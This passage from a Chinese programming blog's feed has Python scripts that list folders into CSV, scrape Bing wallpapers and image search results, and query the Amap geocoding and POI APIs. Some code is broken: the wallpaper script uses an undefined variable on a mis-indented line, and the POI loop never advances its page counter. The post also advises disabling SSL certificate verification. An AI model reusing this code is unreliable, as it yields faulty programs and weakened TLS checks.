    <link href="http://llmysnow.top/posts/5a7a946b/"/>
    <id>http://llmysnow.top/posts/5a7a946b/</id>
    <published>2021-06-10T07:33:21.518Z</published>
    <updated>2021-06-10T07:53:53.155Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ul><li><p>替换 <code>image path</code> 为你想获取的地址</p><p>file 获取文件名称/数量</p><p>floder 获取文件夹名称/数量</p></li><li><p>可以服务器或 CMD 中使用（不能在 Git Bash 中使用）</p></li></ul><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getFile.py &#123;image path&#125; &#123;file/floder&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B61.jpg"></p><h2 id="文件名-getFile-py"><a href="#文件名-getFile-py" class="headerlink" title="文件名 getFile.py"></a>文件名 getFile.py</h2><p>效果如下：</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B62.jpg"></p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">&quot;Usage python getFile.py &#123;image path&#125; &#123;file/floder&#125;&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">root_path = sys.argv[<span class="number">1</span>].replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">type_f = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> type_f != <span class="string">&#x27;file&#x27;</span> <span class="keyword">and</span> type_f != <span class="string">&#x27;floder&#x27;</span>:</span><br><span class="line">    print(<span class="string">&quot;Usage &#123;file/floder&#125;&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">File_list = []</span><br><span class="line">Primary_list = []</span><br><span class="line">Secondary_list = []</span><br><span class="line">Count = []</span><br><span class="line">Floder = []</span><br><span class="line">name = root_path.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> dirpath, dirnames, files <span class="keyword">in</span> os.walk(root_path):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> files:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> dirpath == root_path:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dir_Primary, dir_Secondary = dirpath.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        File_list.append(file)</span><br><span class="line">        Primary_list.append(dir_Primary)</span><br><span class="line">        Secondary_list.append(dir_Secondary)</span><br><span class="line">    Floder.append(dir_Secondary)</span><br><span class="line">    Count.append(<span class="built_in">str</span>(<span class="built_in">len</span>(files)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> type_f == <span class="string">&#x27;file&#x27;</span>:</span><br><span class="line">    print(<span class="string">f&#x27;文件数量 <span class="subst">&#123;<span class="built_in">len</span>(File_list)&#125;</span>&#x27;</span>)</span><br><span class="line">    content_dict = &#123;</span><br><span class="line">        <span class="string">&#x27;PrimaryFolder&#x27;</span>: Primary_list,</span><br><span class="line">        <span class="string">&#x27;SecondaryFolder&#x27;</span>: Secondary_list,</span><br><span class="line">        <span class="string">&#x27;Filename&#x27;</span>: File_list,</span><br><span class="line">    &#125;</span><br><span class="line">    df = pd.DataFrame(content_dict)</span><br><span class="line">    df.to_csv(os.path.join(root_path, <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>_file.csv&#x27;</span>), encoding=<span class="string">&#x27;utf_8_sig&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> type_f == <span class="string">&#x27;floder&#x27;</span>:</span><br><span class="line">    print(<span class="string">f&#x27;文件夹数量 <span class="subst">&#123;<span class="built_in">len</span>(Floder)&#125;</span>&#x27;</span>)</span><br><span class="line">    content_dict = &#123;</span><br><span class="line">        <span class="string">&#x27;Floder&#x27;</span>: Floder,</span><br><span class="line">        <span class="string">&#x27;Count&#x27;</span>: Count,</span><br><span class="line">    &#125;</span><br><span class="line">    df = pd.DataFrame(content_dict)</span><br><span class="line">    df.to_csv(os.path.join(root_path, <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>_floder.csv&#x27;</span>), encoding=<span class="string">&#x27;utf_8_sig&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;使用方法&quot;&gt;&lt;a href=&quot;#使用方法&quot; class=&quot;headerlink&quot; title=&quot;使用方法&quot;&gt;&lt;/a&gt;使用方法&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;替换 &lt;code&gt;image path&lt;/code&gt; 为你想获取的地址&lt;/p&gt;
&lt;p&gt;file 获取文件名称/数量&lt;/p&gt;
&lt;p&gt;floder 获取文件夹名称/数量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;可以服务器或 CMD 中使用（不能在 Git Bash 中使用）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Python" scheme="http://llmysnow.top/categories/Python/"/>
    
    
    <category term="Python" scheme="http://llmysnow.top/tags/Python/"/>
    
    <category term="批处理" scheme="http://llmysnow.top/tags/%E6%89%B9%E5%A4%84%E7%90%86/"/>
    
    <category term="导出Excel" scheme="http://llmysnow.top/tags/%E5%AF%BC%E5%87%BAExcel/"/>
    
    <category term="获取文件" scheme="http://llmysnow.top/tags/%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Python 爬取必应（壁纸+搜索词）</title>
    <link href="http://llmysnow.top/posts/d6422dce/"/>
    <id>http://llmysnow.top/posts/d6422dce/</id>
    <published>2021-06-10T06:59:52.929Z</published>
    <updated>2021-06-10T07:51:59.108Z</updated>
    
    <content type="html"><![CDATA[<h2 id="爬取必应壁纸"><a href="#爬取必应壁纸" class="headerlink" title="爬取必应壁纸"></a>爬取必应壁纸</h2><p>经常使用必应应该可以发现，其主页每天都会更新一张图片，这些图片很好看，希望每天能够下载收藏每张图片。具体请看这个网站：必应每日高清壁纸(<a href="https://bing.ioliu.cn/">https://bing.ioliu.cn/</a>)</p><a id="more"></a><p>效果如下：</p><p><img data-src="https://img-blog.csdnimg.cn/20200628162535832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70" alt="效果"></p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span>(<span class="params">num</span>):</span></span><br><span class="line">    page_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num+<span class="number">1</span>):</span><br><span class="line">        url = <span class="string">f&#x27;https://bing.ioliu.cn/?p=<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        page_list.append(url)</span><br><span class="line">    <span class="keyword">return</span> page_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span>(<span class="params">url</span>):</span></span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    html = r.text</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_html</span>(<span class="params">html</span>):</span></span><br><span class="line">    pattern1 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;data-progressive.*?src=&quot;(.*?)&quot;&#x27;</span>)</span><br><span class="line">    pattern2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;h3&gt;(.*?)&lt;/h3&gt;&#x27;</span>)</span><br><span class="line">    img_list = re.findall(pattern1, html)</span><br><span class="line">    title_list = re.findall(pattern2, html)</span><br><span class="line">    <span class="keyword">return</span> img_list, title_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">path, img_list, title_list</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(img_list)):</span><br><span class="line">        img_url = img_list[i]</span><br><span class="line">        title = title_list[i]</span><br><span class="line">        img_url = img_url.replace(<span class="string">&#x27;640&#x27;</span>, <span class="string">&#x27;1920&#x27;</span>).replace(<span class="string">&#x27;480&#x27;</span>, <span class="string">&#x27;1080&#x27;</span>)</span><br><span class="line">        pattern3 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[()-/_]&#x27;</span>)</span><br><span class="line">        title = re.sub(pattern3, <span class="string">&#x27;&#x27;</span>, title)</span><br><span class="line">        print(<span class="string">f&#x27;正在爬取: <span class="subst">&#123;img_url&#125;</span>&#x27;</span>)</span><br><span class="line">        img_floder = <span class="string">&#x27;D:/图片/&#x27;</span>+keyword</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(img_floder):</span><br><span class="line">            os.makedirs(img_floder)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;img_floder&#125;</span>/<span class="subst">&#123;title&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            img_content = requests.get(img_url).content</span><br><span class="line">            f.write(img_content)</span><br><span class="line">        <span class="comment"># 将爬取失败的删除</span></span><br><span class="line"><span class="keyword">if</span> os.path.getsize(img_path) &lt; <span class="number">50</span>:</span><br><span class="line">            os.remove(img_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num = <span class="number">20</span></span><br><span class="line">    keyword = <span class="string">&#x27;必应壁纸&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;D:/图片/&#x27;</span></span><br><span class="line">    page_list = get_page(num)</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> page_list:</span><br><span class="line">        html = get_html(page)</span><br><span class="line">        img_list, title_list = parse_html(html)</span><br><span class="line">        download(path, img_list, title_list)</span><br></pre></td></tr></table></figure><h2 id="根据搜索词爬取必应图片"><a href="#根据搜索词爬取必应图片" class="headerlink" title="根据搜索词爬取必应图片"></a>根据搜索词爬取必应图片</h2><p>这里需要注意： <code>requests.get(url, headers=headers).text</code> 会有很多 html 转义编码的字符，比如：引号变为<code>&amp;quot</code>，会影响使用正则</p><p><strong>解决方法：</strong></p><ol><li>正则中加入<code>&amp;quot</code></li><li>使用 <code>etree.HTML</code> 重新加载一下，再用 <code>xpath</code> 定位到此处</li></ol><p><strong>出现问题：</strong></p><ol><li><p>请求超时</p><p>设置请求超时时间，防止长时间停留在同一个请求</p><p><code>socket.setdefaulttimeout(10)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectionError: HTTPConnectionPool(host=<span class="string">&#x27;www.iutour.cn&#x27;</span>, port=<span class="number">80</span>): </span><br><span class="line">        </span><br><span class="line">Max retries exceeded <span class="keyword">with</span> url: /uploadfile/bjzb/<span class="number">20141126124539763.j</span>pg </span><br><span class="line">(Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPConnection object at 0x000001A46192EC50&gt;: </span></span><br><span class="line"><span class="string">                              </span></span><br><span class="line"><span class="string">Failed to establish a new connection: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。&#x27;</span>,))</span><br></pre></td></tr></table></figure></li><li><p>需要验证证书</p><p><code>requests.get(img_url, verify=False)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.SSLError: HTTPSConnectionPool(host=<span class="string">&#x27;bbp.jp&#x27;</span>, port=<span class="number">443</span>):</span><br><span class="line"></span><br><span class="line">Max retries exceeded <span class="keyword">with</span> url: /wp-content/uploads/<span class="number">2016</span>/05/<span class="number">2</span>-<span class="number">20.j</span>pg </span><br><span class="line">(Caused by SSLError(SSLError(<span class="string">&quot;bad handshake: Error([(&#x27;SSL routines&#x27;, &#x27;tls_process_server_certificate&#x27;, &#x27;certificate verify failed&#x27;)],)&quot;</span>,),))</span><br></pre></td></tr></table></figure></li></ol><p>直接使用 <code>try:catch</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span>(<span class="params">num</span>):</span></span><br><span class="line">    img_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((num // <span class="number">35</span>) + <span class="number">1</span>):</span><br><span class="line">        url = <span class="string">f&#x27;https://cn.bing.com/images/async?q=<span class="subst">&#123;keyword&#125;</span>&amp;first=<span class="subst">&#123;i*<span class="number">35</span>&#125;</span>&amp;count=35&amp;relp=35&amp;scenario=ImageBasicHover&amp;datsrc=I&amp;layout=RowBased_Landscape&amp;mmasync=1&#x27;</span></span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        html = r.text</span><br><span class="line">        html = etree.HTML(html)</span><br><span class="line">        conda_list = html.xpath(<span class="string">&#x27;//a[@class=&quot;iusc&quot;]/@m&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> conda_list:</span><br><span class="line">            pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;murl&quot;:&quot;(.*?)&quot;&#x27;</span>)</span><br><span class="line">            img_url = re.findall(pattern, j)[<span class="number">0</span>]</span><br><span class="line">            img_list.append(img_url)</span><br><span class="line">    <span class="keyword">return</span> img_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">path, img_list</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(img_list)):</span><br><span class="line">        img_url = img_list[i]</span><br><span class="line">        print(<span class="string">f&#x27;正在爬取: <span class="subst">&#123;img_url&#125;</span>&#x27;</span>)</span><br><span class="line">        img_floder = <span class="string">&#x27;D:/图片/&#x27;</span>+keyword</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(img_floder):</span><br><span class="line">            os.makedirs(img_floder)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;img_floder&#125;</span>/<span class="subst">&#123;i&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                img_content = requests.get(img_url).content</span><br><span class="line">                f.write(img_content)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num = <span class="number">100</span></span><br><span class="line">    keyword = <span class="string">&#x27;食品街&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;D:/图片/&#x27;</span></span><br><span class="line">    img_list = get_page(num)</span><br><span class="line">    download(path, img_list)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;爬取必应壁纸&quot;&gt;&lt;a href=&quot;#爬取必应壁纸&quot; class=&quot;headerlink&quot; title=&quot;爬取必应壁纸&quot;&gt;&lt;/a&gt;爬取必应壁纸&lt;/h2&gt;&lt;p&gt;经常使用必应应该可以发现，其主页每天都会更新一张图片，这些图片很好看，希望每天能够下载收藏每张图片。具体请看这个网站：必应每日高清壁纸(&lt;a href=&quot;https://bing.ioliu.cn/&quot;&gt;https://bing.ioliu.cn/&lt;/a&gt;)&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="http://llmysnow.top/categories/Python/"/>
    
    
    <category term="Python" scheme="http://llmysnow.top/tags/Python/"/>
    
    <category term="批处理" scheme="http://llmysnow.top/tags/%E6%89%B9%E5%A4%84%E7%90%86/"/>
    
    <category term="爬取必应" scheme="http://llmysnow.top/tags/%E7%88%AC%E5%8F%96%E5%BF%85%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Python 查询并爬取地理信息</title>
    <link href="http://llmysnow.top/posts/676d36dc/"/>
    <id>http://llmysnow.top/posts/676d36dc/</id>
    <published>2021-06-10T06:38:16.213Z</published>
    <updated>2021-06-10T07:51:59.107Z</updated>
    
    <content type="html"><![CDATA[<p>看了 B站up主 应心小栈 的视频有感 <a href="https://space.bilibili.com/95113417/">应心小栈</a></p><a id="more"></a><h2 id="一、高德地图"><a href="#一、高德地图" class="headerlink" title="一、高德地图"></a>一、高德地图</h2><h3 id="地理编码"><a href="#地理编码" class="headerlink" title="地理编码"></a>地理编码</h3><p><img data-src="https://img-blog.csdnimg.cn/20191018183654671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70" alt="gaode"></p><p>操作步骤：</p><ol><li>申请 <strong>Web服务API 密钥（key）</strong><br><a href="https://lbs.amap.com/dev/index">申请密钥链接</a></li><li>拼接 HTTP 请求 URL<br>这里选用的是【地理编码】</li></ol><p><strong>修改 address 和 key</strong></p><ul><li>address=&lt;搜索的地址&gt;</li><li>key=&lt;用户的key&gt;<br><code>https://restapi.amap.com/v3/geocode/geo?address=&lt;搜索的地址&gt;&amp;output=XML&amp;key=&lt;用户的key&gt;</code></li></ul><ol start="3"><li>接收HTTP请求返回的数据（JSON 或 XML 格式），解析数据。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">base_url = <span class="string">&#x27;https://restapi.amap.com/v3/geocode/geo?address=&#x27;</span></span><br><span class="line"><span class="comment">#填写key</span></span><br><span class="line">fun_url = <span class="string">&#x27;&amp;output=XML&amp;key=您的key&#x27;</span></span><br><span class="line">address = <span class="string">&#x27;北京大学&#x27;</span></span><br><span class="line">url = base_url + address + fun_url</span><br><span class="line">response = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">location_source = <span class="built_in">str</span>(soup.find(<span class="string">&#x27;location&#x27;</span>))</span><br><span class="line">location_down = re.split(<span class="string">&#x27;&lt;|&gt;&#x27;</span>,location_source)[<span class="number">2</span>]</span><br><span class="line">location_out = re.split(<span class="string">&#x27;,&#x27;</span>,location_down)</span><br><span class="line">longitude = location_out[<span class="number">0</span>]</span><br><span class="line">latitude = location_out[<span class="number">1</span>]</span><br><span class="line">print(<span class="string">&#x27;经度为：&#123;&#125; 纬度为：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(longitude,latitude))</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>经度为：<span class="number">116.308264</span> 纬度为：<span class="number">39.995304</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="搜索POI"><a href="#搜索POI" class="headerlink" title="搜索POI"></a>搜索POI</h3><p><img data-src="https://img-blog.csdnimg.cn/20200526152357308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70" alt="使用POI"><br><img data-src="https://img-blog.csdnimg.cn/20200526152415980.png" alt="接口_高德"><br>详细参数参考链接：<a href="https://lbs.amap.com/api/webservice/guide/api/search">https://lbs.amap.com/api/webservice/guide/api/search</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;https://restapi.amap.com/v3/place/text?&#x27;</span></span><br><span class="line">page = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  data = &#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;您的key&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;keywords&#x27;</span>: <span class="string">&#x27;海底捞&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;南京&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;output&#x27;</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;page&#x27;</span>: page&#125;</span><br><span class="line">  html = requests.get(url,params=data,headers=headers)</span><br><span class="line">  j = html.json()</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(j[<span class="string">&#x27;pois&#x27;</span>])):</span><br><span class="line">    data1 = [(j[<span class="string">&#x27;pois&#x27;</span>][i][<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            j[<span class="string">&#x27;pois&#x27;</span>][i][<span class="string">&#x27;address&#x27;</span>],</span><br><span class="line">            j[<span class="string">&#x27;pois&#x27;</span>][i][<span class="string">&#x27;pname&#x27;</span>],</span><br><span class="line">            j[<span class="string">&#x27;pois&#x27;</span>][i][<span class="string">&#x27;cityname&#x27;</span>],</span><br><span class="line">            j[<span class="string">&#x27;pois&#x27;</span>][i][<span class="string">&#x27;adname&#x27;</span>],</span><br><span class="line">            j[<span class="string">&#x27;pois&#x27;</span>][i][<span class="string">&#x27;tel&#x27;</span>],</span><br><span class="line">            j[<span class="string">&#x27;pois&#x27;</span>][i][<span class="string">&#x27;location&#x27;</span>],</span><br><span class="line">            j[<span class="string">&#x27;pois&#x27;</span>][i][<span class="string">&#x27;biz_ext&#x27;</span>][<span class="string">&#x27;rating&#x27;</span>])]</span><br><span class="line">    data2 = pd.DataFrame(data1)</span><br><span class="line">    data2.to_csv(<span class="string">&#x27;map_gaode.csv&#x27;</span>,header=<span class="literal">False</span>,index=<span class="literal">False</span>,mode=<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">print(<span class="built_in">str</span>(page)+<span class="string">&#x27;has done&#x27;</span>)</span><br><span class="line">page += <span class="number">1</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>爬取效果如下：</p><p><img 